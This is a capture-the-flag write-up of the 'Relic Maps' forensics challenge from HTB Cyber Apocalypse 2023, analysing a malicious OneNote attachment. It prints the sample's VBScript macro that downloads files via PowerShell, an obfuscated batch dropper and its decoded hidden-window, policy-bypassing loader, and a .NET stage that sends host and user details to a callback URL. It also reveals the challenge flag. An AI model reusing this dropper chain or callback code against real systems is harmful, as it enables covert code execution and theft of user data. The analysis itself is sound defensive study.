# Cyber Apocalypse 2023

## Relic Maps

> Pandora received an email with a link claiming to have information about the location of the relic and attached ancient city maps, but something seems off about it. Could it be rivals trying to send her off on a distraction? Or worse, could they be trying to hack her systems to get what she knows?Investigate the given attachment and figure out what's going on and get the flag. The link is to http://relicmaps.htb:/relicmaps.one. The document is still live (relicmaps.htb should resolve to your docker instance).
>
>  Author: N/A
>

Tags: _forensics_

## Solution
For this challenge no files are provided, only the link in the hint. To make the site reachable the domain needs to be added to `/etc/hosts`. After doing so the file can be downloaded. Running `file` on the file only leads `relicmaps.one: data`.

Next up, `binwalk`, this indeed leads a few files.
```
$ binwalk --dd ".*" relicmaps.one

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
10388         0x2894          PNG image, 1422 x 900, 8-bit/color RGBA, non-interlaced
10924         0x2AAC          Zlib compressed data, best compression
47215         0xB86F          HTML document header
48865         0xBEE1          HTML document footer
50084         0xC3A4          PNG image, 32 x 32, 8-bit/color RGBA, non-interlaced
50636         0xC5CC          PNG image, 440 x 66, 8-bit/color RGB, non-interlaced
50727         0xC627          Zlib compressed data, compressed
```

Most notably the HTML document. It has some malicious VBScript in it that seems to download more files.

```
// snip...
Sub AutoOpen()
    ExecuteCmdAsync "cmd /c powershell Invoke-WebRequest -Uri http://relicmaps.htb/uploads/soft/topsecret-maps.one -Out>
    ExecuteCmdAsync "cmd /c powershell Invoke-WebRequest -Uri http://relicmaps.htb/get/DdAbds/window.bat -OutFi>
End Sub
// snip...
```

 Fetching `topsecret-maps.one` seems like a dead end, but `windows.bat` is interesting:

```
@echo off
set "eFlP=set "
%eFlP%"ualBOGvshk=ws"
%eFlP%"PxzdwcSExs= /"
%eFlP%"ndjtYQuanY=po"
%eFlP%"cHFmSnCqnE=Wi"
%eFlP%"CJnGNBkyYp=co"
%eFlP%"jaXcJXQMrV=rS"
...
:: SEWD/RSJz4q93dq1c+u3tVcKPbLfn1fTrwl01pkHX3+NzcJ42N+ZgqbF+h+S76xsuroW3DDJ50IxTV/PbQICDVPjPCV3DYvCc244F7AFWphPY3kRy+618kpRSK2jW9RRcOnj8dOuDyeLwHfnBbkGgLE4KoSttWBplznkmb1l50KEFUavXv9ScKbGilo9+85NRKfafzpZjkMhwaCuzbuGZ1+5s9CdUwvo3znUpgmPX7S8K4+uS3SvQNh5iPNBdZHmyfZ9SbSATnsXlP757ockUsZTEdltSce4ZWF1779G6RjtKJcK4yrHGpRIZFYJ3pLosmm7d+SewKQu1vGJwcdLYuHOkdm5mglTyp20x7rDNCxobvCug4Smyrbs8XgS3R4jHMeUl7gdbyV/eTu0bQAMJnIql2pEU/dW0krE90nlgr3tbtitxw3p5nUP9hRYZLLMPOwJ12yNENS7Ics1ciqYh78ZWJiotAd4DEmAjr8zU4U...
...
%CJnGNBkyYp%%UBndSzFkbH%%ujJtlzSIGW%%nwIWiBzpbz%%cHFmSnCqnE%%kTEDvsZUvn%%JBRccySrUq%%ZqjBENExAX%%XBucLtReBQ%%BFTOQBPCju%%vlwWETKcZH%%NCtxqhhPqI%%GOPdPuwuLd%%YcnfCLfyyS%%JPfTcZlwxJ%%ualBOGvshk%%xprVJLooVF%%cIqyYRJWbQ%%jaXcJXQMrV%%pMrovuxjjq%%KXASGLJNCX%%XzrrbwrpmM%%VCWZpprcdE%%tzMKflzfvX%%ndjtYQuanY%%chXxviaBCr%%tHJYExMHlP%%WmUoySsDby%%UrPeBlCopW%%lYCdEGtlPA%%eNOycQnIZD%%PxzdwcSExs%%VxroDYJQKR%%zhNAugCrcK%%XUpMhOyyHB%%OOOxFGwzUd%
cls
%dzPrbmmccE%%xQseEVnPet%
%eDhTebXJLa%%vShQyqnqqU%%KsuJogdoiJ%%uVLEiIUjzw%%SJsEzuInUY%%gNELMMjyFY%%XIAbFAgCIP%%weRTbbZPjT%%yQujDHraSv%%zwDBykiqZZ%%nfEeCcWKKK%%MtoMzhoqyY%%igJmqZApvQ%%SIQjFslpHA%%KHqiJghRbq%%WSRbQhwrOC%%BGoTReCegg%%WYJXnBQBDj%%SIneUaQPty%%WTAeYdswqF%%E
```

This obviously is obfuscated code, to make things more clear we need to deobfuscate the whole thing. Luckily the obfuscation can be easily reverted by replacing the random string constants with what they are set to. While doing this by hand is cumbersome we can quickly write a [`script`](deobfuscate.py).

```
with open("data.txt", "r") as file:
    lines = file.readlines()

d = {}
for line in lines:
    parts = line.split("=", 1)
    d[parts[0]] = parts[1].rstrip("\n")

print(d)

code1 = """%CJnGNBkyYp%%UBndSz..."

for x, y in d.items():
    code1 = code1.replace("%"+x+"%", y)

print(code1)
```

The data provided is from the batch script, but roughly prepared for parsing

```
ualBOGvshk=ws
PxzdwcSExs= /
ndjtYQuanY=po
cHFmSnCqnE=Wi
CJnGNBkyYp=co
jaXcJXQMrV=rS
nwIWiBzpbz=:\
xprVJLooVF=Po
tzMKflzfvX=0\
VCWZpprcdE=1.
XzrrbwrpmM=\v
BFTOQBPCju=st
WmUoySsDby=he
tHJYExMHlP=rs
JPfTcZlwxJ=do
VxroDYJQKR=y 
UBndSzFkbH=py
KXASGLJNCX=ll
vlwWETKcZH=em
OOOxFGwzUd=e
NCtxqhhPqI=32
GOPdPuwuLd=\W
XUpMhOyyHB=ex
cIqyYRJWbQ=we
```

After cleaning the result up a bit, we end up with an readable version of the script:

```
copy C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe /y %~0.exe

cls
cd %~dp0
%~nx0.exe -noprofile -windowstyle hidden -ep bypass -command $eIfqq = [System.IO.File]::('txeTllAdaeR'[-1..-11] -join '')('%~f0').Split([Environment]::NewLine)

foreach ($YiLGW in $eIfqq) { 
	if ($YiLGW.StartsWith(':: ')) {  
		$VuGcO = $YiLGW.Substring(3)
 		break
 	}
}

$uZOcm = [System.Convert]::('gnirtS46esaBmorF'[-1..-16] -join '')($VuGcO)
$BacUA = New-Object System.Security.Cryptography.AesManaged
$BacUA.Mode = [System.Security.Cryptography.CipherMode]::CBC
$BacUA.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
$BacUA.Key = [System.Convert]::('gnirtS46esaBmorF'[-1..-16] -join '')('0xdfc6tTBkD+M0zxU7egGVErAsa/NtkVIHXeHDUiW20=')
$BacUA.IV = [System.Convert]::('gnirtS46esaBmorF'[-1..-16] -join '')('2hn/J717js1MwdbbqMn7Lw==')
$Nlgap = $BacUA.CreateDecryptor()
$uZOcm = $Nlgap.TransformFinalBlock($uZOcm, 0, $uZOcm.Length)
$Nlgap.Dispose()
$BacUA.Dispose()
$mNKMr = New-Object System.IO.MemoryStream(, $uZOcm)
$bTMLk = New-Object System.IO.MemoryStream
$NVPbn = New-Object System.IO.Compression.GZipStream($mNKMr, [IO.Compression.CompressionMode]::Decompress)
$NVPbn.CopyTo($bTMLk)
$NVPbn.Dispose()
$mNKMr.Dispose()
$bTMLk.Dispose()
$uZOcm = $bTMLk.ToArray()
$gDBNO = [System.Reflection.Assembly]::('daoL'[-1..-4] -join '')($uZOcm)
$PtfdQ = $gDBNO.EntryPoint
$PtfdQ.Invoke($null, (, [string[]] ('%*')))
```

While some obfuscation remains (reversed function names) the script is well understandable. It basically copies powershell to the local folder and renames the exe to match the scripts name.

```
copy C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe /y %~0.exe

cls
cd %~dp0
```

After that the script reads itself and scans for a line that starts with ':: '. This is the encrypted payload.

```
%~nx0.exe -noprofile -windowstyle hidden -ep bypass -command $eIfqq = [System.IO.File]::('txeTllAdaeR'[-1..-11] -join '')('%~f0').Split([Environment]::NewLine)

foreach ($YiLGW in $eIfqq) { 
	if ($YiLGW.StartsWith(':: ')) {  
		$VuGcO = $YiLGW.Substring(3)
 		break
 	}
}
```

Then the payload gets decrypted and decompressed. The `key` and `iv` for AES decryption is provided as base64 decoded string. In the last step an assembly instance is created and invoked. 

If PowerShell is at hand we can extract the payload with the script (after removing the invocation of the payload of course). Otherwise a small python script [`can do the same thing`](extract.py):

```
import base64
from Crypto.Cipher import AES
import gzip

with open("payload") as file:
    lines = file.readlines()

key = base64.b64decode("0xdfc6tTBkD+M0zxU7egGVErAsa/NtkVIHXeHDUiW20=")
iv = base64.b64decode("2hn/J717js1MwdbbqMn7Lw==")
payload = base64.b64decode(lines[0])

cipher = AES.new(key, AES.MODE_CBC, iv)
decrypted = cipher.decrypt(payload)
decompressed = gzip.decompress(payload)

with open("payload.decrypted", "wb") as out:
    out.write(decompressed)
```

Checking the extracted payload with `file` and indeed it's a .NET executable.
```
$ file payload
payload: PE32 executable (console) Intel 80386 Mono/.Net assembly, for MS Windows
```

This can quickly be decompiled with ILSpy.
```
private static void Main(string[] args)
{
	IPAddress iPAddress = Dns.GetHostAddresses(Dns.GetHostName()).FirstOrDefault((IPAddress ip) => ip.AddressFamily == AddressFamily.InterNetwork);
	string machineName = Environment.MachineName;
	string userName = Environment.UserName;
	DateTime now = DateTime.Now;
	string text = "HTB{0neN0Te?_iT'5_4_tr4P!}";
	string s = $"i={iPAddress}&n={machineName}&u={userName}&t={now}&f={text}";
	Aes aes = Aes.Create("AES");
	aes.Mode = CipherMode.CBC;
	aes.Key = Convert.FromBase64String("B63PbsPUm3dMyO03Cc2lYNT2oUNbzIHBNc5LM5Epp6I=");
	aes.IV = Convert.FromBase64String("dgB58uwgaohVelj4Xhs7RQ==");
	aes.Padding = PaddingMode.PKCS7;
	ICryptoTransform cryptoTransform = aes.CreateEncryptor();
	byte[] bytes = Encoding.UTF8.GetBytes(s);
	string text2 = Convert.ToBase64String(cryptoTransform.TransformFinalBlock(bytes, 0, bytes.Length));
	Console.WriteLine(text2);
	HttpClient httpClient = new HttpClient();
	HttpRequestMessage httpRequestMessage = new HttpRequestMessage
	{
		RequestUri = new Uri("http://relicmaps.htb/callback"),
		Method = HttpMethod.Post,
		Content = new StringContent(text2, Encoding.UTF8, "application/json")
	};
	Console.WriteLine(httpRequestMessage);
	HttpResponseMessage result = httpClient.SendAsync(httpRequestMessage).Result;
	Console.WriteLine(result.StatusCode);
	Console.WriteLine(result.Content.ReadAsStringAsync().Result);
}
```

Reading through that it seems invoking the script would have called back to relicmaps.htb with some user information. Appart from that the flag is ready for capture `HTB{0neN0Te?_iT'5_4_tr4P!}`
